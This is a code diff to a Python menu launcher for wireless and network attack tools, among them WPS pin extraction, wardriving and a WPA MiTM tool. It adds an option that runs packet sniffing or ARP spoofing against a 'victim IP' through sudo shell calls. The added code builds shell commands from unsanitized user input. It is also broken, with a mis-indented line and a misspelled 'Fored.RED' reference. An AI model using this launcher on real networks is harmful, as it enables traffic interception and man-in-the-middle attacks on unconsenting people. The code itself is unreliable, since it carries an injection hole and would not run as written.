@@ -31,7 +31,8 @@ def main():
   print('*[13] HT-WPS (WPS Pin Extraction Tool)                   *')
   print('*[14] Kismet GPS Wardriver                               *')
   print('*[15] Linset (WPA/WPA2 MiTM Attack Tool)                 *')
-  print('*[16] Exit                                               *' + Style.RESET_ALL)
+  print('*[16] Espionage (Packet Sniffer/ARP Spoofer)             *')
+  print('*[17] Exit                                               *' + Style.RESET_ALL)
   print('==========================================================')
   in_put = input(': ')
   if in_put == '1':
@@ -235,6 +236,26 @@ def main():
       print(Fore.RED + '[*]Error running linset' + Style.RESET_ALL)
     os.chdir('..')
   if in_put == '16':
+    print(Fore.CYAN + '[*]Running Espionage Packet sniffer...')
+    option = input(Fore.CYAN + "[*]Do you want to [p]acket sniff or ARP [s]poof? " + Style.RESET_ALL)
+    os.chdir("Espionage")
+    if option == 'p' or option == 'P':
+      try:
+        os.system('sudo python3 espionage.py --iface ' + interface + ' --normal -f espionage_output.pcap')
+        print(Fore.GREEN + '[+]Successfully ran espionage' + Style.RESET_ALL)
+      except:
+        print(Fore.RED + '[*]Error running espionage' + Style.RESET_ALL)
+    elif option == 's' or option == 'S':
+    vip = input(Fore.CYAN + '[*]Enter victim IP: ' + Style.RESET_ALL)
+      try:
+        os.system('sudo python3 espionage.py --target ' + vip + ' --iface ' + interface)
+        print(Fore.GREEN + '[+]Successfully ran espionage' + Style.RESET_ALL)
+      except:
+        print(Fore.RED + '[*]Error running espionage' + Style.RESET_ALL)
+    else:
+      print(Fored.RED + "[*]Please enter a valid option" + Style.RESET_ALL)
+    os.chdir('..')
+  if in_put == '17':
     print(Fore.CYAN + '[*]Shutting down ' + interface + 'mon...' + Style.RESET_ALL)
     os.system('airmon-ng stop ' + interface)
     os.system('airmon-ng stop ' + interface + 'mon')
